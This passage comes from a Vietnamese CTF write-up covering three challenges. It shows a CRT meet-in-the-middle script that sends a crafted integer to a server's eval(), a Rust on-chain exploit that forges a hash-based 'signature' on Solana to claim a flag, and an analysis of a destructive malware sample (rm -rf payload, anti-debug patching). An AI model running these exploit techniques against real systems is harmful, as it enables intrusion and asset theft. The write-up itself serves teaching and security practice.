*   C√°c file `.bin` kh√°c: M·ªôt trong s·ªë ƒë√≥ ch·ª©a chu·ªói Flag c·ªßa ch∆∞∆°ng tr√¨nh.

> **Flag:** `csd{Kr4mPU5_RE4llY_l1ke5_T0_m4kE_EVeRytH1NG_CU5t0m_672Df}`
{:.prompt-flag}

**B√†i h·ªçc r√∫t ra:**
1.  **Context is King:** identifier `ks2025` kh√¥ng th·ªÉ t√¨m th·∫•y n·∫øu kh√¥ng ƒë·ªçc k·ªπ m√¥ t·∫£ v·ªÅ t√™n nh√≥m v√† c√°ch ƒë·∫∑t version.
2.  **Verify t·ª´ng b∆∞·ªõc:** Vi·ªác gi·∫£i m√£ FAT th√†nh c√¥ng (Offset = 0) l√† m·ªëc quan tr·ªçng ƒë·ªÉ kh·∫≥ng ƒë·ªãnh h∆∞·ªõng ƒëi ƒë√∫ng tr∆∞·ªõc khi loay hoay v·ªõi Derived Key.
3.  **Key Derivation:** Hi·ªÉu r√µ c√°ch c√°c h·ªá th·ªëng file an to√†n sinh kh√≥a con (k·∫øt h·ª£p Index/Offset) ƒë·ªÉ tr√°nh d√πng chung keystream RC4.


---

## Escape Assist

> **Category:** Cryptography
{: .prompt-info}

**Objective:** T√¨m s·ªë nguy√™n `n` th·ªèa m√£n c√°c ƒëi·ªÅu ki·ªán ƒë·ªìng d∆∞ ph·ª©c t·∫°p ƒë·ªÉ k√≠ch ho·∫°t l·ªó h·ªïng `eval()` v√† ƒë·ªçc c·ªù.

### 1. Ph√¢n t√≠ch source code

Th·ª≠ th√°ch cung c·∫•p m·ªôt server ch·∫°y ƒëo·∫°n code Python v·ªõi c√°c ƒë·∫∑c ƒëi·ªÉm sau:

1.  **T·∫°o kh√≥a:** Server sinh ra 42 s·ªë nguy√™n t·ªë ng·∫´u nhi√™n `ps` (ƒë·ªô d√†i 26-bit).
2.  **T√≠nh N:** $N$ l√† t√≠ch c·ªßa t·∫•t c·∫£ 42 s·ªë nguy√™n t·ªë n√†y ($N = \prod p_i$).
3.  **ƒêi·ªÅu ki·ªán ki·ªÉm tra:** Ng∆∞·ªùi d√πng g·ª≠i s·ªë nguy√™n `n`. Server ki·ªÉm tra:
    *   $0 \le n < N$
    *   V·ªõi **m·ªçi** s·ªë nguy√™n t·ªë $p_i$, s·ªë d∆∞ $n \pmod{p_i}$ ph·∫£i thu·ªôc t·∫≠p h·ª£p `goods`.
4.  **T·∫≠p h·ª£p `goods`:** Code ƒë·ªãnh nghƒ©a `goods = [6, 7, -1, 13]`.
    *   Tuy nhi√™n, m√¥ t·∫£ b√†i thi c√≥ g·ª£i √Ω: *"turned the jail into 6 7"* (bi·∫øn nh√† t√π th√†nh 6 7).
    *   ƒê√¢y l√† g·ª£i √Ω quan tr·ªçng ƒë·ªÉ gi·ªõi h·∫°n kh√¥ng gian t√¨m ki·∫øm ch·ªâ c√≤n `{6, 7}`.
5.  **L·ªó h·ªïng:** N·∫øu v∆∞·ª£t qua ki·ªÉm tra, server ch·∫°y `print(eval(long_to_bytes(n)))`.

### 2. √ù t∆∞·ªüng khai th√°c

M·ª•c ti√™u c·ªßa ch√∫ng ta l√† t·∫°o ra m·ªôt payload `n` sao cho:
1.  `long_to_bytes(n)` l√† m·ªôt ƒëo·∫°n m√£ Python h·ª£p l·ªá ƒë·ªÉ in ra c·ªù.
2.  $n \pmod{p_i} \in \{6, 7\}$ v·ªõi m·ªçi $p_i$.

#### V·∫•n ƒë·ªÅ 1: Payload l√† g√¨?
Ch√∫ng ta c·∫ßn in bi·∫øn `flag`. Payload ƒë∆°n gi·∫£n nh·∫•t l√† chu·ªói `flag`.
Tuy nhi√™n, s·ªë `n` ƒë∆∞·ª£c t·∫°o ra t·ª´ to√°n h·ªçc s·∫Ω r·∫•t l·ªõn (kho·∫£ng 130 bytes). 4 byte ƒë·∫ßu l√† `flag`, c√≤n h∆°n 100 byte sau s·∫Ω l√† "r√°c" ng·∫´u nhi√™n do t√≠nh ch·∫•t c·ªßa ph√©p to√°n.
ƒê·ªÉ Python kh√¥ng b√°o l·ªói c√∫ ph√°p v√¨ ph·∫ßn r√°c n√†y, ta d√πng k√Ω t·ª± `#` (comment).
&rarr; **Payload m·ª•c ti√™u:** `b'flag#'` (ph·∫ßn sau `#` s·∫Ω b·ªã Python b·ªè qua).

#### V·∫•n ƒë·ªÅ 2: "R√°c" ƒë·ªôc h·∫°i
M·∫∑c d√π `#` gi√∫p b·ªè qua r√°c, nh∆∞ng n·∫øu trong ph·∫ßn r√°c v√¥ t√¨nh xu·∫•t hi·ªán k√Ω t·ª± xu·ªëng d√≤ng (`\n` - byte 10 ho·∫∑c `\r` - byte 13), Python s·∫Ω coi l√† h·∫øt d√≤ng comment v√† c·ªë th·ª±c thi ph·∫ßn r√°c ti·∫øp theo &rarr; G√¢y l·ªói **SyntaxError**.
&rarr; **Y√™u c·∫ßu ph·ª•:** S·ªë `n` t√¨m ƒë∆∞·ª£c kh√¥ng ƒë∆∞·ª£c ch·ª©a byte `10` ho·∫∑c `13`.

#### V·∫•n ƒë·ªÅ 3: To√°n h·ªçc (ƒê·ªãnh l√Ω s·ªë d∆∞ Trung Hoa - CRT)
Ch√∫ng ta c·∫ßn t√¨m $n$ sao cho:
$$
\begin{cases}
n \equiv r_1 \pmod{p_1} \\
n \equiv r_2 \pmod{p_2} \\
\dots \\
n \equiv r_{42} \pmod{p_{42}}
\end{cases}
$$
Trong ƒë√≥ $r_i$ ch·ªâ ƒë∆∞·ª£c ch·ªçn t·ª´ $\{6, 7\}$.
T·ªïng s·ªë tr∆∞·ªùng h·ª£p l√† $2^{42}$ (kho·∫£ng 4.4 ngh√¨n t·ª∑). ƒê√¢y l√† m·ªôt con s·ªë qu√° l·ªõn ƒë·ªÉ th·ª≠ h·∫øt (Brute-force), nh∆∞ng ƒë·ªß nh·ªè ƒë·ªÉ d√πng thu·∫≠t to√°n th√¥ng minh h∆°n.

### 3. Thu·∫≠t to√°n gi·∫£i quy·∫øt: Meet-in-the-Middle (MITM)

ƒê·ªÉ t√¨m ra b·ªô $r_i$ sao cho $n$ b·∫Øt ƒë·∫ßu b·∫±ng `flag#`, ta d√πng k·ªπ thu·∫≠t **Meet-in-the-Middle** (G·∫∑p nhau ·ªü gi·ªØa):

1.  **Chia ƒë√¥i:** Chia 42 s·ªë nguy√™n t·ªë th√†nh 2 nh√≥m:
    *   Nh√≥m Tr√°i (Left): 21 s·ªë ƒë·∫ßu.
    *   Nh√≥m Ph·∫£i (Right): 21 s·ªë sau.
    *   ƒê·ªô ph·ª©c t·∫°p gi·∫£m t·ª´ $2^{42}$ xu·ªëng $2 \times 2^{21}$ (kho·∫£ng 2 tri·ªáu ph√©p t√≠nh m·ªói b√™n - r·∫•t nhanh).

2.  **T√≠nh to√°n CRT t·ª´ng ph·∫ßn:**
    *   T√≠nh tr·ªçng s·ªë CRT `weights[i]` cho m·ªói v·ªã tr√≠.
    *   T√≠nh t·∫•t c·∫£ c√°c t·ªïng CRT c√≥ th·ªÉ cho nh√≥m Tr√°i v√† l∆∞u v√†o danh s√°ch `L`.
    *   T√≠nh t·∫•t c·∫£ c√°c t·ªïng CRT c√≥ th·ªÉ cho nh√≥m Ph·∫£i v√† l∆∞u v√†o danh s√°ch `R`.

3.  **T√¨m ki·∫øm gh√©p c·∫∑p:**
    *   S·∫Øp x·∫øp danh s√°ch `L` ƒë·ªÉ t√¨m ki·∫øm nhanh (Binary Search).
    *   Duy·ªát qua t·ª´ng gi√° tr·ªã `r` trong danh s√°ch `R`.
    *   Ta c·∫ßn t√¨m `l` trong danh s√°ch `L` sao cho:
        $(l + r) \pmod N \approx \text{Target (flag\#...)}$
    *   C·ª• th·ªÉ, t·ªïng $(l+r)$ ph·∫£i n·∫±m trong kho·∫£ng $[\text{flag\#00...00}, \text{flag\#FF...FF}]$.

4.  **Ki·ªÉm tra ƒëi·ªÅu ki·ªán cu·ªëi:**
    *   Khi t√¨m ƒë∆∞·ª£c c·∫∑p `(l, r)` th·ªèa m√£n kho·∫£ng gi√° tr·ªã, ta t√≠nh `n = (l + r) % N`.
    *   Chuy·ªÉn `n` sang bytes v√† ki·ªÉm tra xem c√≥ ch·ª©a `\n` hay `\r` kh√¥ng. N·∫øu kh√¥ng &rarr; **Th√†nh c√¥ng!**

### 4. Script (SageMath)

```python
import socket
from bisect import bisect_left
from Crypto.Util.number import long_to_bytes, bytes_to_long

HOST = 'ctf.csd.lol'
PORT = 5000
PAYLOAD = b'flag#' 

def attempt_solve(attempt_count):
    # 1. K·∫øt n·ªëi v√† nh·∫≠n 42 s·ªë nguy√™n t·ªë
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    # ... (Code nh·∫≠n d·ªØ li·ªáu primes) ...

    # 2. Chu·∫©n b·ªã d·ªØ li·ªáu CRT
    ps = primes
    N = prod(ps)
    weights = []
    for p in ps:
        # T√≠nh tr·ªçng s·ªë ƒë√≥ng g√≥p c·ªßa t·ª´ng p v√†o t·ªïng N
        M = N // p
        y = inverse_mod(M, p)
        weights.append((M * y) % N)

    # 3. K·ªπ thu·∫≠t Meet-in-the-Middle
    mid = 21
    
    # T·∫°o b·∫£ng Trai (L) - T·∫•t c·∫£ c√°c t·ªï h·ª£p c·ªßa 21 s·ªë ƒë·∫ßu v·ªõi d∆∞ 6 ho·∫∑c 7
    L = [0]
    for i in range(mid):
        w = weights[i]
        L = [(x + 6*w) % N for x in L] + [(x + 7*w) % N for x in L]
    L.sort() # S·∫Øp x·∫øp ƒë·ªÉ t√¨m ki·∫øm nh·ªã ph√¢n
    
    # T·∫°o b·∫£ng Ph·∫£i (R)
    R = [0]
    for i in range(mid, 42):
        w = weights[i]
        R = [(x + 6*w) % N for x in R] + [(x + 7*w) % N for x in R]

    # 4. Qu√©t t√¨m nghi·ªám
    # X√°c ƒë·ªãnh kho·∫£ng gi√° tr·ªã m·ª•c ti√™u (Target Range)
    n_len = (N.bit_length() + 7) // 8
    pad_len = n_len - len(PAYLOAD)
    
    # Gi√° tr·ªã nh·ªè nh·∫•t (flag# + to√†n bit 0)
    t_min = bytes_to_long(PAYLOAD + b'\x00' * pad_len)
    # Gi√° tr·ªã l·ªõn nh·∫•t (flag# + to√†n bit 1)
    t_max = bytes_to_long(PAYLOAD + b'\xff' * pad_len)

    # V·ªõi m·ªói ph·∫ßn t·ª≠ r b√™n Ph·∫£i, t√¨m l b√™n Tr√°i sao cho l + r r∆°i v√†o [t_min, t_max]
    for r_val in R:
        low = (t_min - r_val) % N
        high = (t_max - r_val) % N
        
        # D√πng bisect_left ƒë·ªÉ t√¨m ki·∫øm c·ª±c nhanh trong L
        # ... (Logic t√¨m ki·∫øm v√† x·ª≠ l√Ω wrap-around) ...
        
        # N·∫øu t√¨m th·∫•y l, ki·ªÉm tra ƒëi·ªÅu ki·ªán xu·ªëng d√≤ng
        n = (l_val + r_val) % N
        b = long_to_bytes(n)
        if b.startswith(PAYLOAD) and b'\n' not in b and b'\r' not in b:
            # G·ª≠i n v√† l·∫•y c·ªù!
            s.sendall(f"{n}\n".encode())
            print(s.recv(4096))
            return True
    return False
```

> **Flag:** `csd{6767676767676_c85ac0a47cdd255d547197d522770b79}`
{:.prompt-flag}

---

## Solwanna

> **Category:** Blockchain / Miscellaneous
{: .prompt-info}

**Description:** H·ªá th·ªëng ph√°t qu√† c·ªßa √¥ng gi√† Noel ch·∫°y tr√™n Solana. Nhi·ªám v·ª• c·ªßa ch√∫ng ta l√† khai th√°c l·ªó h·ªïng trong c∆° ch·∫ø ki·ªÉm tra "ch·ªØ k√Ω s·ªë" ƒë·ªÉ nh·∫≠n ƒë∆∞·ª£c m√≥n qu√† l√† "FLAG".

### Ph√¢n t√≠ch (Analysis)

Source code c·ªßa ch∆∞∆°ng tr√¨nh (Smart Contract) n·∫±m trong th∆∞ m·ª•c `program/src/lib.rs`. Ch∆∞∆°ng tr√¨nh c√≥ 3 ch·ªâ l·ªánh (instruction) ch√≠nh:
1.  `Init`: Kh·ªüi t·∫°o tr·∫°ng th√°i √¥ng gi√† Noel (`santa_state`).
2.  `GetPresentToken`: Nh·∫≠n m·ªôt voucher qu√† t·∫∑ng ng·∫´u nhi√™n.
3.  `ClaimPresentToken`: ƒê·ªïi voucher l·∫•y qu√†.

Ch√∫ng ta t·∫≠p trung v√†o h√†m `process_claim_present` v√¨ ƒë√¢y l√† n∆°i tr·∫£ v·ªÅ Flag:

```rust
fn process_claim_present(program_id: &Pubkey, accounts: &[AccountInfo], present: String, signature: [u8; 32]) -> ProgramResult {
    // ... (L·∫•y account info) ...
    let state = SolwannaState::try_from_slice(&santa_state_account.data.borrow())?;

    // LOGIC KI·ªÇM TRA CH·ªÆ K√ù
    let mut data_to_verify = present.as_bytes().to_vec();
    data_to_verify.extend_from_slice(state.santa_pubkey.as_ref());
    data_to_verify.reverse(); // ƒê·∫£o ng∆∞·ª£c chu·ªói byte
    let expected_signature = keccak::hash(&data_to_verify);

    // So s√°nh ch·ªØ k√Ω ng∆∞·ªùi d√πng g·ª≠i l√™n v·ªõi ch·ªØ k√Ω h·ªá th·ªëng t√≠nh to√°n
    if signature != expected_signature.to_bytes() {
        msg!("Invalid voucher! You get a big lump of coal!");
        return Ok(());
    }

    if present == "FLAG" {
        msg!("Ho ho ho! You got the flag! Congratulations!");
        // ... (Ghi nh·∫≠n tr·∫°ng th√°i user ƒë√£ l·∫•y flag)
    }
    // ...
}
```

### L·ªó h·ªïng (Vulnerability)

M√¥ t·∫£ ƒë·ªÅ b√†i n√≥i r·∫±ng: *"every voucher is cryptographically signed by Santa personally"*. Tuy nhi√™n, khi nh√¨n v√†o code, ch√∫ng ta th·∫•y:

1.  **Kh√¥ng c√≥ m√£ h√≥a b·∫•t ƒë·ªëi x·ª©ng:** H·ªá th·ªëng kh√¥ng d√πng Private Key c·ªßa Santa ƒë·ªÉ k√Ω (v√≠ d·ª• nh∆∞ Ed25519 signature).
2.  **Thu·∫≠t to√°n c√¥ng khai:** "Ch·ªØ k√Ω" th·ª±c ch·∫•t ch·ªâ l√† m·ªôt h√†m bƒÉm (Hash): `Keccak256(Reverse("T√™n m√≥n qu√†" + Santa_Public_Key))`.
3.  **D·ªØ li·ªáu c√¥ng khai:** `present` l√† chu·ªói ch√∫ng ta mu·ªën (v√≠ d·ª• "FLAG"), v√† `santa_pubkey` ƒë∆∞·ª£c l∆∞u c√¥ng khai tr√™n blockchain trong account `santa_state`.

**K·∫øt lu·∫≠n:** B·∫•t k·ª≥ ai c≈©ng c√≥ th·ªÉ ƒë·ªçc `santa_pubkey`, t·ª± t√≠nh to√°n ra `signature` h·ª£p l·ªá cho chu·ªói `"FLAG"` v√† g·ª≠i l√™n Contract ƒë·ªÉ v∆∞·ª£t qua b√†i ki·ªÉm tra.

### Chi·∫øn l∆∞·ª£c khai th√°c (Exploit Strategy)

V√¨ b√†i thi y√™u c·∫ßu t∆∞∆°ng t√°c gi·ªØa c√°c ch∆∞∆°ng tr√¨nh tr√™n Solana, ch√∫ng ta s·∫Ω vi·∫øt m·ªôt **On-chain Program (Solver)** ƒë·ªÉ th·ª±c hi·ªán t·∫•n c√¥ng th√¥ng qua **CPI (Cross-Program Invocation)**.

Quy tr√¨nh nh∆∞ sau:
1.  **Read:** ƒê·ªçc d·ªØ li·ªáu t·ª´ account `santa_state` ƒë·ªÉ l·∫•y `santa_pubkey`.
2.  **Forge:** T√≠nh to√°n ch·ªØ k√Ω gi·∫£ m·∫°o:
    *   T·∫°o buffer: `"FLAG"` + `santa_pubkey`.
    *   ƒê·∫£o ng∆∞·ª£c (Reverse) buffer.
    *   Hash b·∫±ng Keccak256.
3.  **Attack:** G·ªçi CPI t·ªõi instruction `ClaimPresentToken` c·ªßa ch∆∞∆°ng tr√¨nh m·ª•c ti√™u v·ªõi tham s·ªë l√† `"FLAG"` v√† ch·ªØ k√Ω v·ª´a t√≠nh.

### M√£ khai th√°c (Exploit Code)

#### Rust Contract (`solve/src/lib.rs`)

```rust
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    keccak,
    program::invoke,
};

// Import c·∫•u tr√∫c d·ªØ li·ªáu t·ª´ ch∆∞∆°ng tr√¨nh g·ªëc
use solwanna::{SolwannaInstructions, SolwannaState};

entrypoint!(solve);

pub fn solve(_program_id: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();

    // L·∫•y c√°c account c·∫ßn thi·∫øt
    let challenge_program = next_account_info(accounts_iter)?;
    let santa_state_account = next_account_info(accounts_iter)?;
    let user_state_account = next_account_info(accounts_iter)?;
    let user_account = next_account_info(accounts_iter)?;
    let system_program = next_account_info(accounts_iter)?;

    // B∆Ø·ªöC 1: L·∫•y Santa Pubkey t·ª´ on-chain data
    let santa_data = santa_state_account.try_borrow_data()?;
    let santa_state = SolwannaState::try_from_slice(&santa_data)?;
    let santa_pubkey = santa_state.santa_pubkey;
    drop(santa_data); // Gi·∫£i ph√≥ng bi·∫øn m∆∞·ª£n (borrow)

    // B∆Ø·ªöC 2: T√≠nh to√°n ch·ªØ k√Ω gi·∫£ (Forged Signature)
    let present = "FLAG".to_string();
    let mut data_to_sign = present.as_bytes().to_vec();
    data_to_sign.extend_from_slice(santa_pubkey.as_ref());
    data_to_sign.reverse(); // Quan tr·ªçng: ƒê·∫£o ng∆∞·ª£c chu·ªói byte
    
    let signature_hash = keccak::hash(&data_to_sign);
    let signature = signature_hash.to_bytes();

    // B∆Ø·ªöC 3: T·∫°o l·ªánh g·ªçi (Instruction)
    let ix_data = SolwannaInstructions::ClaimPresentToken {
        present,
        signature,
    };

    // Chu·∫©n b·ªã instruction ƒë·ªÉ g·ªçi sang ch∆∞∆°ng tr√¨nh Solwanna
    let instruction = Instruction {
        program_id: *challenge_program.key,
        accounts: vec![
            AccountMeta::new(*user_account.key, true),       // User (Signer/Payer)
            AccountMeta::new(*santa_state_account.key, false), 
            AccountMeta::new(*user_state_account.key, false), 
            AccountMeta::new_readonly(*system_program.key, false),
        ],
        data: borsh::to_vec(&ix_data)?,
    };

    // Th·ª±c hi·ªán CPI
    invoke(
        &instruction,
        &[
            user_account.clone(),
            santa_state_account.clone(),
            user_state_account.clone(),
            system_program.clone(),
            challenge_program.clone(),
        ],
    )?;

    Ok(())
}
```

Script Python `solve/solve.py` ƒë√≥ng vai tr√≤ l√† Client. N√≥ s·∫Ω ƒë·ªçc file binary Rust ƒë√£ bi√™n d·ªãch (`solwanna_solve.so`), g·ª≠i l√™n server ƒë·ªÉ deploy, sau ƒë√≥ g·ª≠i danh s√°ch c√°c Account (g·ªìm Program ID, Santa State, User State...) ƒë·ªÉ th·ª±c thi h√†m `solve` on-chain v√† l·∫•y c·ªù.

> **L∆∞u √Ω:** C·∫ßn ch·ªânh s·ª≠a ƒë∆∞·ªùng d·∫´n file `.so` trong script Python tr·ªè ƒë√∫ng v√†o th∆∞ m·ª•c `target/deploy/` n∆°i file binary ƒë∆∞·ª£c build ra.


Khi ch·∫°y script Python, server tr·∫£ v·ªÅ flag:

```
PROGRAM= 11157t3sqMV725NVRLrVQbAu98Jjfk1uCKehJnXXQs
SANTA_STATE= J3BmEB6sJ23PGwk4fK76gtXSqo6MQmxTtupbouz9Cxqb
USER_STATE= CQdjnUuEkHzotbJapnRSuEDvrGnzj8VeCN8k478MRTjZ
USER= HVtNpw3qD6AjaBnyDGkzNupXB6Mu9SWTtyySZ1KWNJAh
b'num accounts: \nix len: \nFlag: '
csd{placeholder_flag}
```

> **Flag:** `csd{p3rh4ps_i75_t1m3_t0_l34rn_what_k3ys_R_4ctua11y_f0r...}`
{:.prompt-flag}

---
**B√†i h·ªçc:**
Trong ph√°t tri·ªÉn Smart Contract, kh√¥ng bao gi·ªù tin t∆∞·ªüng c√°c c∆° ch·∫ø ki·ªÉm tra b·∫£o m·∫≠t d·ª±a tr√™n d·ªØ li·ªáu c√¥ng khai (nh∆∞ Public Key) m√† kh√¥ng c√≥ s·ª± tham gia c·ªßa Private Key ƒë·ªÉ t·∫°o ch·ªØ k√Ω s·ªë th·ª±c s·ª±. H√†m bƒÉm (Hash) kh√¥ng ph·∫£i l√† ch·ªØ k√Ω ƒëi·ªán t·ª≠.

---

## Operation Black Ice

> **Category:** Reverse Engineering
{: .prompt-info}

### T·ªïng quan
*   **Th·ª≠ th√°ch:** Reverse Engineering m·ªôt m·∫´u malware ph√° ho·∫°i h·ªá th·ªëng.
*   **M·ª•c ti√™u:** T√¨m ra "Kill Switch" (c∆° ch·∫ø ng·∫Øt) ƒë·ªÉ ngƒÉn malware th·ª±c thi v√† l·∫•y Flag.
*   **K·ªπ thu·∫≠t s·ª≠ d·ª•ng:** Static Analysis (IDA/Ghidra), Patching binary, Dynamic Analysis (GDB), De-obfuscation (Control Flow Flattening), Cryptanalysis.

### Ph√¢n t√≠ch Tƒ©nh (Static Analysis) & Anti-Debug

Khi m·ªü file trong c√¥ng c·ª• disassembler, ta th·∫•y lu·ªìng ch∆∞∆°ng tr√¨nh r·∫•t kh√≥ ƒë·ªçc do k·ªπ thu·∫≠t **Control Flow Flattening** (L√†m ph·∫≥ng lu·ªìng ƒëi·ªÅu khi·ªÉn - code nh·∫£y lo·∫°n x·∫° qua c√°c switch-case).

Ngo√†i ra, h√†m `FUN_0012111c` ch·ª©a k·ªπ thu·∫≠t **Anti-Debug** c·ªï ƒëi·ªÉn:
*   S·ª≠ d·ª•ng l·ªánh `rdtsc` ƒë·ªÉ ƒëo s·ªë chu k·ª≥ CPU (CPU cycles) khi th·ª±c thi m·ªôt ƒëo·∫°n l·ªánh.
*   N·∫øu th·ªùi gian th·ª±c thi > `0x10000000` (d·∫•u hi·ªáu ƒëang b·ªã debug/step-over), ch∆∞∆°ng tr√¨nh g·ªçi `_exit` ƒë·ªÉ t·ª± s√°t.

#### B∆∞·ªõc 1: Patch Anti-Debug
ƒê·ªÉ debug ƒë∆∞·ª£c b·∫±ng GDB, ta c·∫ßn v√¥ hi·ªáu h√≥a ki·ªÉm tra n√†y.
*   **V·ªã tr√≠:** L·ªánh nh·∫£y ƒëi·ªÅu ki·ªán `JBE` (Jump if Below or Equal) t·∫°i offset `0x1211ba`.
*   **Thao t√°c:** S·ª≠a opcode t·ª´ `76` (`JBE`) th√†nh `EB` (`JMP`).
*   **K·∫øt qu·∫£:** Ch∆∞∆°ng tr√¨nh lu√¥n nh·∫£y ƒë·∫øn nh√°nh an to√†n, b·ªè qua l·ªánh `_exit`.

#### T√¨m t√™n file Kill Switch (Dynamic Analysis)

Malware ki·ªÉm tra s·ª± t·ªìn t·∫°i c·ªßa m·ªôt file c·ª• th·ªÉ tr∆∞·ªõc khi k√≠ch ho·∫°t payload ph√° ho·∫°i (`rm -rf`).
S·ª≠ d·ª•ng **GDB** ƒë·ªÉ hook v√†o h√†m h·ªá th·ªëng `access`:

1.  ƒê·∫∑t breakpoint: `break access`.
2.  Ch·∫°y ch∆∞∆°ng tr√¨nh (`run`).
3.  Khi d·ª´ng, ki·ªÉm tra thanh ghi `RDI` (ch·ª©a tham s·ªë t√™n file).

**K·∫øt qu·∫£:** Malware t√¨m ki·∫øm file **`/tmp/killswitch-fe16`**.
Ta t·∫°o file n√†y: `touch /tmp/killswitch-fe16`.

### Ph√¢n t√≠ch Thu·∫≠t to√°n M√£ h√≥a (Core Logic)

H√†m `FUN_001061fb` ch·ª©a logic ki·ªÉm tra n·ªôi dung file.
*   **Data Source:** File ƒë∆∞·ª£c ƒë·ªçc v√†o buffer.
*   **Algorithm:** Rolling Key XOR & Shuffle.
    *   D·ªØ li·ªáu ƒë∆∞·ª£c so s√°nh v·ªõi m·ªôt v√πng nh·ªõ tƒ©nh (Target Data).
    *   M·∫£ng ho√°n v·ªã (`Shuffle Index`) x√°c ƒë·ªãnh th·ª© t·ª± byte ƒë∆∞·ª£c ki·ªÉm tra.
    *   **Key kh·ªüi t·∫°o:** 4 byte t·∫°i offset 16 c·ªßa t√™n file.
        *   T√™n file: `/tmp/killswitch-fe16`
        *   Offset 16: `fe16`
        *   Gi√° tr·ªã Hex (Little Endian): `0x36316566`.
    *   **Rolling Key:** Sau m·ªói l·∫ßn gi·∫£i m√£ 4 byte, Key ƒë∆∞·ª£c c·∫≠p nh·∫≠t b·∫±ng c√°ch c·ªông d·ªìn gi√° tr·ªã v·ª´a gi·∫£i m√£: `Key = Key + Decrypted_Value`.

### Tr√≠ch xu·∫•t D·ªØ li·ªáu (Data Extraction)

ƒê√¢y l√† b∆∞·ªõc kh√≥ khƒÉn nh·∫•t. D·ªØ li·ªáu tƒ©nh trong static analysis (`DAT_0012500c`) b·ªã thi·∫øu ph·∫ßn ƒë·∫ßu.
S·ª≠ d·ª•ng GDB ƒë·ªÉ dump tr·ª±c ti·∫øp b·ªô nh·ªõ khi ch∆∞∆°ng tr√¨nh ƒëang ch·∫°y:

*   T√¨m ƒë·ªãa ch·ªâ ch·ª©a chu·ªói Hex ƒë·∫∑c tr∆∞ng c·ªßa Flag sau khi m√£ h√≥a.
*   Dump 320 bytes t·ª´ ƒë·ªãa ch·ªâ `0x555555579000`.

### Gi·∫£i m√£ (Solver Script)

Script Python cu·ªëi c√πng ƒë·ªÉ gi·∫£i m√£ d·ª±a tr√™n d·ªØ li·ªáu dump chu·∫©n:

```python
import struct

data_dump = [
0x05, 0x16, 0x55, 0x4d, 0xb9, 0xb4, 0xf1, 0xee,
0x6a, 0x11, 0xa5, 0x25, 0xbf, 0xc6, 0x6d, 0x71,
0x8c, 0x8a, 0xf0, 0x7d, 0xc1, 0x35, 0x65, 0x0e,
0x57, 0xf9, 0x4d, 0x82, 0xe2, 0xa2, 0xdf, 0x69,
0x61, 0x02, 0x17, 0xe6, 0x4c, 0x8b, 0x08, 0x9b,
0xf1, 0xc0, 0xc0, 0x50, 0x7b, 0x14, 0x49, 0xc8,
0xb0, 0x3e, 0xce, 0xc1, 0xdb, 0x8a, 0x9c, 0x5a,
0x58, 0x8a, 0x6c, 0xd0, 0xec, 0x5f, 0xd2, 0x2e,
0x74, 0xdb, 0x95, 0x7e, 0x03, 0x2f, 0x14, 0x4c,
0x8f, 0x10, 0xbe, 0xc0, 0x78, 0x98, 0x0a, 0x46,
0xe8, 0x82, 0x46, 0xd7, 0xc0, 0x38, 0x94, 0xb8,
0x77, 0xd3, 0xaa, 0x2a, 0xec, 0x1a, 0x25, 0xd7,
0xad, 0x68, 0x8e, 0x20, 0x66, 0xce, 0x9d, 0x7a,
0xfb, 0x94, 0x26, 0xfa, 0x9f, 0x0b, 0xee, 0x94,
0x0a, 0xe7, 0x44, 0x3a, 0xeb, 0x32, 0x51, 0xb2,
0x7f, 0x4a, 0xad, 0x48, 0x4c, 0x81, 0xfa, 0xf3,
0xde, 0x8d, 0x5b, 0x6a, 0x72, 0x22, 0x1d, 0x2d,
0xd5, 0x8d, 0xb5, 0xe2, 0xd9, 0x84, 0x1a, 0x77,
0x2d, 0x38, 0xef, 0x22, 0x2f, 0xf7, 0x88, 0xab,
0x9f, 0x9a, 0x09, 0x03, 0xb3, 0x1d, 0xe9, 0x00,
0x23, 0xed, 0x4a, 0xb9, 0xec, 0x77, 0x07, 0x75,
0x6b, 0x27, 0x8c, 0x44, 0xbe, 0xe3, 0x24, 0x94,
0xa8, 0x38, 0x96, 0xb8, 0x1b, 0x60, 0x4a, 0x0c,
0x04, 0xd4, 0xdf, 0x3d, 0x89, 0x9e, 0xec, 0xb3,
0xd9, 0x32, 0x64, 0x00, 0x7e, 0xb9, 0xb9, 0x5c,
0xca, 0x68, 0xed, 0xc8, 0xfd, 0xa6, 0x72, 0x9a,
0x78, 0xf7, 0x01, 0x03, 0x2e, 0xa8, 0xdc, 0x8f,
0xbc, 0x2b, 0x1f, 0xf0, 0x74, 0xa2, 0x2c, 0x94,
0x12, 0x38, 0x63, 0x39, 0xa8, 0x8c, 0xee, 0x9e,
0x22, 0x9d, 0x9c, 0x44, 0x8e, 0x31, 0x31, 0xfc,
0xda, 0xfe, 0xfe, 0xca, 0x54, 0x32, 0x73, 0x4e,
0xa9, 0x5a, 0x17, 0x84, 0xfd, 0xc1, 0xbc, 0xbb,
0x80, 0x05, 0x43, 0x44, 0x19, 0x6d, 0x1c, 0x77,
0xea, 0x19, 0x91, 0x28, 0x70, 0xee, 0x8a, 0x9c,
0x1f, 0x69, 0x06, 0x14, 0x80, 0x42, 0x00, 0x65,
0x0f, 0xca, 0xb7, 0xba, 0x30, 0x76, 0x09, 0xda,
0x91, 0x1b, 0x5d, 0x48, 0x4a, 0xd7, 0xa8, 0xa7,
0xcb, 0x7c, 0xe2, 0xa9, 0xc0, 0xb6, 0x68, 0x5a,
0x11, 0xdf, 0x43, 0xfd, 0x36, 0x40, 0x97, 0x77
]

# X·ª≠ l√Ω dump th√†nh bytes
target_bytes = bytes(data_dump)

# 2. M·∫£ng ho√°n v·ªã
shuffle_indices = [
    0x00, 0x25, 0x17, 0x40, 0x4b, 0x22, 0x08, 0x06, 0x2c, 0x37, 0x48, 0x1c, 0x1d, 0x3a, 0x03, 0x3f,
    0x02, 0x3d, 0x27, 0x43, 0x11, 0x3e, 0x23, 0x0f, 0x41, 0x38, 0x01, 0x1e, 0x16, 0x19, 0x3c, 0x36,
    0x26, 0x0b, 0x2d, 0x05, 0x13, 0x32, 0x2b, 0x0c, 0x21, 0x28, 0x0d, 0x1a, 0x2f, 0x30, 0x14, 0x49,
    0x3b, 0x07, 0x15, 0x44, 0x04, 0x18, 0x4c, 0x1b, 0x29, 0x2a, 0x24, 0x0a, 0x42, 0x4a, 0x10, 0x45,
